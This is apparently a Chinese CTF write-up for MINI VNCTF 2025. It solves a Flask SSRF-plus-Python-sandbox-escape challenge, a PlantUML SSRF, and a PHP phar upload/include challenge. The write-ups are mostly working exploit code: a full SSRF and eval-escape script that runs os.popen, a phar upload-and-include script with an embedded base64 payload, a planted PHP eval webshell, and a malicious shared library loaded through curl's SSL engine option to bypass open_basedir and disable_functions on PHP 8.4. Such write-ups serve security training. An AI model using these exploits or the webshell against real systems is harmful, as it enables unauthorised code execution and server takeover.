# 【check_in】
```python
'''
I wish you a good head start.
flag is in file namely 'flag' in the same directory as this file.

Good luck!
'''

import re
import flask
import requests
import ipaddress
from urllib.parse import urlparse

GENERAL_WAF_REGEX = r'[a-zA-Z0-9_\[\]{}()<>,.!@#$^&*]{3}' # only two of these characters ;)

app = flask.Flask(__name__)

def general_waf(code):
    # Why do you need so many characters?
    if re.findall(GENERAL_WAF_REGEX, code):
        return True
    else:
        return False

def check_hostname(url):
    # must starts with vnctf.
    if not url.startswith('http://vnctf.'):
        return False

    hostname = urlparse(url).hostname
    query = urlparse(url).query

    # must only contain two of the restricted characters
    if general_waf(query):
        return False

    # must not be an ip address, so no 127.0.0.1 or ::1
    try:
        ipaddress.ip_address(hostname)
        return False
    except ValueError:
        pass

    return url

@app.route('/')
def index():
    return 'Welcome to MINI VNCTF 2025!'

@app.route('/fetch')
def fetch():
    url = flask.request.args.get('url')
    safe_url = check_hostname(url)
    if safe_url:
        try:
            response = requests.get(safe_url, allow_redirects=False) # no redirects
            return response.text
        except:
            return 'Error'
    else:
        return 'Invalid URL'

@app.route('/__internal/safe_eval')
def safe_eval():
    # check if the request is from the internal network
    if flask.request.remote_addr not in ['127.0.0.1', '::1']:
        return 'Forbidden'

    code = flask.request.args.get('hi')

    if len(code) >= 24 * 10 + 8 * 8:
        # Man! What can I say. 
        return 'Invalid code'

    # Ah, if you get here, then your final challenge is to break this jail.
    # Try it. Not as hard as it seems ;)
    blacklist = ['\\x','+','join', '"', "'", '[', ']', '2', '3', '4', '5', '6', '7', '8', '9']
    for i in blacklist:
        if i in code:
            return 'Invalid code'
    
    safe_globals = {'__builtins__':None, 'lit':list, 'dic':dict}

    return repr(eval(code, safe_globals))

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=8080)


```
给了源码，我们大致的看一下功能。
* 一个`/`路由就是一个欢迎页面。
* `/fetch`路由
```python
  @app.route('/fetch')
def fetch():
    url = flask.request.args.get('url')
    safe_url = check_hostname(url)
    if safe_url:
        try:
            response = requests.get(safe_url, allow_redirects=False) # no redirects
            return response.text
        except:
            return 'Error'
    else:
        return 'Invalid URL'
  ```
  接受`get`传的参数`url`，经过check函数之后会向后面指定的`url`发送`get`请求。
  * `check_hostname`函数
  ```python
  def check_hostname(url):
    # must starts with vnctf.
    if not url.startswith('http://vnctf.'):
        return False

    hostname = urlparse(url).hostname
    query = urlparse(url).query

    # must only contain two of the restricted characters
    if general_waf(query):
        return False

    # must not be an ip address, so no 127.0.0.1 or ::1
    try:
        ipaddress.ip_address(hostname)
        return False
    except ValueError:
        pass

    return url
  
  ```
  检查是否`http://vnctf.`开头，并分割`hostname`主机、`query`?后面的参数。
  所以这里？后面的参数不能含有黑名单中的字符。最后还会检查传入的是不是真正的IP，是的话就Flase了。
  通过上面的检查后服务器就会向合法的url发送请求。很明显应该是打ssrf。我们继续看。
  * `/__internal/safe_eval`路由
  ```python
  @app.route('/__internal/safe_eval')
def safe_eval():
    # check if the request is from the internal network
    if flask.request.remote_addr not in ['127.0.0.1', '::1']:
        return 'Forbidden'

    code = flask.request.args.get('hi')

    if len(code) >= 24 * 10 + 8 * 8:
        # Man! What can I say.
        return 'Invalid code'

    # Ah, if you get here, then your final challenge is to break this jail.
    # Try it. Not as hard as it seems ;)
    blacklist = ['\\x','+','join', '"', "'", '[', ']', '2', '3', '4', '5', '6', '7', '8', '9']
    for i in blacklist:
        if i in code:
            return 'Invalid code'

    safe_globals = {'__builtins__':None, 'lit':list, 'dic':dict}

    return repr(eval(code, safe_globals))
  ```
  首先请求必须来自本地才能访问这里，（更加确定是ssrf）
  然后长度不能大于`24 * 10 + 8 * 8=304`
  最后经过一个黑名单检测会进入到eval（很明显的沙箱逃逸）
  ```python
  safe_globals = {'__builtins__':None, 'lit':list, 'dic':dict}

    return repr(eval(code, safe_globals))
  ```
  去掉了`__builtins__`模块，给了我没`list`和`dict`对象
## 绕过
1. 获得本地身份，要走到沙箱逃逸要先打通ssrf，`http://vnctf.`开头且不能被`ipaddress.ip_address(hostname)`解析成IP。我们想到用@连接，`/fetch?url=http://vnctf.@localhost:8080`，这样就满足了，并且http是支持这样写的。我们发现访问8080端口是欢迎页面，源代码中正是开在8080，那这里就是ssrf打通。
2. 绕过两个黑名单沙箱逃逸。首先第一个对url字符的过滤我们可以用`两次url编码`，因为waf规定3次出现黑名单字符则过滤，但是没有过滤`%`，url编码刚好是`%xx`,每处现两次黑名单字符就会打断，完美绕过。这里是因为ssrf要代理发一个包，所以我们要两次url编码。
3. 最后一个黑名单过滤的沙箱逃逸了。首先数字只有`0,1`所以肯定不是常规的利用`subclasses[x]`。我们这里利用`dic+lit`的"取键"操作来绕过了”，‘。
## exp
```python
import requests
import urllib.parse

TARGET_URL = "http://challenge.ilovectf.cn:30208/"

cmd_payload = (
    "lit(dic(cat=1)).pop()"           # "cat"
    ".__add__(lit.__base__.__str__(lit).__getitem__(0))" # "<"
    ".__add__(lit(dic(flag=1)).pop())" # "flag"
)

# 最终的 Payload 结构
payload = (
    # 1. 找到 os._wrap_close 类
    "lit(i for i in lit.__base__.__subclasses__()if lit(dic(wrap_close=1)).pop()in lit.__base__.__str__(i)).pop()"
    # 2. 初始化并获取 popen 函数
    ".__init__.__globals__.get(lit(dic(popen=1)).pop())"
    # 3. 执行命令 (cat<flag)
    f"({cmd_payload})"
    # 4. 读取结果
    ".read()"
)
print(f"[*] Payload 长度: {len(payload)} (限制 304)") # 检查长度，这很重要

# 1. 手动url编码
pass_1_encode = "".join(f"%{ord(c):02x}" for c in payload)
# 2. 双重编码 (% -> %25)
pass_2_encode = pass_1_encode.replace("%", "%25")

# 3. 拼接
full_url = f"{TARGET_URL}/fetch?url=http://vnctf.@localhost:8080/__internal/safe_eval?hi={pass_2_encode}"

# 4. 发送
res = requests.get(full_url)
print(f"\n[+]  执行结果:\n{res.text}")

```
![](assets/miniVNCTF/file-20251207170036464.png)

# 【notebook】
首先简单的测了一下，发现好像都是前端？
试了一个xss，在这上面耗了很久，因为是在找不到其他的了，（但是这里都没有bot，还是太愚顿了）

后来看到题目提示：`plantuml？叽里咕噜说啥呢`
于是去查了一下，居然还是一种语法，有CVE漏洞：
https://forum.butian.net/share/2559
据文章所说PlantUML是一种开源的、用于绘制UML（Unified Modeling Language）图表的工具
![](assets/miniVNCTF/file-20251207170628869.png)
大概就是通过特定的语法把我们的文字转化为图片。

然后就去想，这能在那里利用呢？题目不是笔记系统吗，很可能支持生成图表呀。
输入`/`,查看功能，果然 代码绘图。看到胜利的希望了
![500](assets/miniVNCTF/file-20251207170832512.png)
我们输入文章中的POC，生成图表![500](assets/miniVNCTF/file-20251207170935345.png)
得到提示，八九不离十了，打一波ssrf，换成提示中的路径，成功！
![500](assets/miniVNCTF/file-20251207171054175.png)

# 【法尔plus】（赛后复现）
进来可以拿到源码,还一个是phpinfo界面
```php
<?php
highlight_file(__FILE__);

function waf($data){
    if (is_array($data)){
        die("nonono arrays");
    }
    if (preg_match('/<\?|__HALT_COMPILER|get|Coral|Nimbus|Zephyr|Acheron|ctor|payload|php|filter|base64|rot13|read|data/i', $data)) {
        die("You can't do");
    }
}

class ddd{
    public $pivot;

    public function __set($k, $value) {
        $k = $this->pivot->ctor;
        echo new $k($value);
    }
}

class ccc{
    public $handle;
    public $ctor;

    public function __destruct() {
        return $this->handle();
    }
    public function __call($name, $arg){
        $arg[1] = $this->handle->$name;
    }
}

class bbb{
    public $target;
    public $payload;
    public function __get($prop)
    {
        $this->target->$prop = $this->payload;
    }
}

class aaa {
    public $mode;

    public function __destruct(){
        $data = $_POST[0];
        if ($this->mode == 'w') {
            waf($data);
            echo $data;
            $filename = "/var/www/html/".md5(rand()).".phar";
            file_put_contents($filename, $data);
            echo $filename;
        } else if ($this->mode == 'r') {
            waf($data);
            $f = include($data);
            if($f){
                echo "yesyesyes";
            }
            else{
                echo "You can look at the others";
            }
        }
    }
}

if(strlen($_POST[1]) < 52) {
    $a = unserialize($_POST[1]);
}
else{
    echo "too long!!";
}

?>
```
看到黑名单里的东西，感觉是打phar文件包含/反序列化。
看到题目主要的逻辑点就是，最后有反序列化的点
我们POST传入`0,1`两个参数，`1`会被反序列化，`0`会被写入文件或者包含，至于是包含还是上传，取决于反序列化出来的对象中`$aaa -> mode`
另外上传和包含之前，内容要先经过waf不能包含有指定字符串。我先想到了phar包含（好像给的这些类都不用？）
1. 上传一个phar文件，里面写入test.txt，有php代码，
2. 利用phar伪协议包含文件
## 尝试文件包含
利用脚本生成phar.gz文件（因为会检查phar文件的关键字，所以打一个压缩包绕过）
```php
<?php

$phar_file = "diag.phar";
@unlink($phar_file);
@unlink($phar_file . ".gz");

$phar = new Phar($phar_file);
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$code =
'<?php
phpinfo();
?>';

$phar->addFromString("test.txt", $code);
$phar->stopBuffering();
$phar->compress(Phar::GZ);

echo base64_encode(file_get_contents($phar_file . ".gz"));
?>
```
base64编码是为了方便我们等下复制上传内容。

![](assets/miniVNCTF/file-20251207173557953.png)
运行得到的base64字符串就是我们要上传的内容。
我们使用python脚本发包（因为涉及到先上传在包含，用脚本会比较方便）
```python
import requests
import re
import base64

# ================= 配置 =================
url = "http://challenge.ilovectf.cn:30218/1.php" 

phar_data_b64 = """
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

"""
# =======================================

def attack():

    phar_content = base64.b64decode(phar_data_b64.strip())

    print("[*] 1. 上传 Payload ")

    # Step 1: 上传 (Mode 'w')
    data1 = {
        '0': phar_content,
        '1': 'O:3:"aaa":1:{s:4:"mode";s:1:"w";}'
    }
    r1 = requests.post(url, data=data1)

    # 提取上传后的临时文件名
    match = re.search(r'(/var/www/html/[a-f0-9]{32}\.phar)', r1.text)
    if not match:
        print("[!] 上传失败，未找到路径。")
        print(r1.text)
        return

    filename = match.group(1)
    print(f"[+] 上传成功，路径: {filename}")

    # Step 2: 触发反序列化 (Mode 'r')
    print(f"[*] 2. 触发 文件包含 ...")

    phar_path = f"phar://{filename}/test.txt"

    data2 = {
        '0': phar_path,
        '1': 'O:3:"aaa":1:{s:4:"mode";s:1:"r";}'
    }
    r2 = requests.post(url, data=data2)

    print(r2.text)

if __name__ == "__main__":
    attack()
```
脚本就是单纯的发包，但是为了方便POST[0]的内容就自己手动拼接上去了，反正不麻烦。
发包后：
先通过`file_put_contents($filename, $data);`写入phar文件
在通过`include($data)`包含文件，我们这里设置`$data`为phar伪协议，会自动解压phar文件并包含其中的php文件。
![](assets/miniVNCTF/file-20251207174103687.png)
可以看到我们上面写的`phpinfo()`已经执行了。现在我们已经有了php任意代码执行。
这里我们可以传一个后门上去就不用每次都构造了。
```php
<?php

$phar_file = "write.phar";
@unlink($phar_file);
@unlink($phar_file . ".gz");

$phar = new Phar($phar_file);
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$shell_content = "<?php @eval(\$_POST['cmd']);?>";
$target_file = '/var/www/html/1.txt';

$code = '<?php
$f = '.var_export($target_file, true).';
$c = '.var_export($shell_content, true).';

if (file_put_contents($f, $c)) {
    echo "Success!";
}

?>';

$phar->addFromString("test.txt", $code);
$phar->stopBuffering();
$phar->compress(Phar::GZ); // 必须压缩

echo base64_encode(file_get_contents($phar_file . ".gz"));
?>
```
![](assets/miniVNCTF/file-20251207174641018.png)
可以看到已经拿到webshell了。但是会发现`system`等函数都执行不了，用`file_get_contents`等函数也只能看当前目录。题目说phpinfo很重要。一看
结果设置了`open_basedir`和`disable_function`。这里我就被卡住了，用尽了办法也没绕过取，是新版本，但是谷歌居然没搜到，我就以为是我的方向错了，呜呜呜

后来赛后师傅提示了我一下去仔细搜了一下，果然有最新php 8.4的`open_basedir`绕过
https://fushuling.com/index.php/2025/11/01/%E6%9C%80%E6%96%B0%E7%89%88-php-%E7%BB%95-open_basedir-%E5%92%8C-disable_functions/
这里我试了文中提到的最新的反而没成功，用相对过时的反而成功了，好奇怪。
![](assets/miniVNCTF/file-20251207181321995.png)也是看到这位师傅说的，发现比赛环境刚好是8.4.14。所以采用了文章中说的非预期。


我们先准备一个`a.cpp`文件
```cpp
#include <stdlib.h>

__attribute__((constructor))
static void rce_init(void){
    system("whoami > /var/www/html/abc.txt");
}
```
编译为`so`文件,同时输出base64编码形式
```bash
┌──(root💀JYli)-[~]
└─# g++ -fPIC -shared -o evil.so a.cpp&&base64 -w 0 evil.so
```
会得到一大串base64字符。
接下来的步骤就是：
1. 把so文件写入。
```php
$base64_so = "{base64字符串}";
file_put_contents("/var/www/html/exploit.so",base64_decode($base64_so));
```
2. 利用curl加载so文件
```php
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSLENGINE,"/var/www/html/exploit.so");
$data = curl_exec($ch);
```

![](assets/miniVNCTF/file-20251207181951562.png)
但是这里好像是无回显的，所以我选择了写入文件，改变命令只需要修改cpp文件即可。
![](assets/miniVNCTF/file-20251207182036691.png)
（为了保证绕过了，还是cat了一下，以下过程和上面完全一样）
![](assets/miniVNCTF/file-20251207182950816.png)